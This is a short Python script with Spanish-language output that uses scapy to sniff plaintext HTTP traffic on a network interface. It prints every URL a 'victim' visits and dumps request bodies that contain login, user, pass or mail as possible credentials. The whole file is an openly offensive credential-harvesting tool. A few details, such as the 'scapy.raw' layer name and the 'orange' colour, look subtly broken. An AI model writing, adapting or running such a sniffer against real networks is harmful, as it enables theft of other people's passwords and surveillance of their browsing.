#!/bin/python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import sys
import signal

def def_handler(sig, frame):
    print(colored(f'\n[!] Saliendo del programa....', 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):

    cred_keywords = [ 'login', 'user', 'pass' , 'mail']

    if packet.haslayer(http.HTTPRequest):

        url = 'http://'+ packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"[+] URL visitada por la victima: {url}", 'green'))


        if packet.haslayer(scapy.raw):
    
            try:
                response = packet[scapy.raw].load.decode()
            
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credentials: {response}", 'orange'))
                        break

            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():
    sniff('enp0s3')

if __name__ == '__main__':
    main()
